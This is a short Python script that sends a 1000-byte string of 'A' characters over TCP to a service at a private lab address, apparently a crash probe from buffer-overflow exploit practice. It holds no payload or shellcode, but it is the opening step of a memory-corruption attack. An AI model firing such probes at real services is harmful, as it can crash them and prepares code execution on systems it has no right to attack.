import socket

msg = "\x41" * 1000
host = "192.168.33.34"
port = 12345
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((host, port))
sock.send(msg.encode())
recv = sock.recv(4096)
print(recv.decode())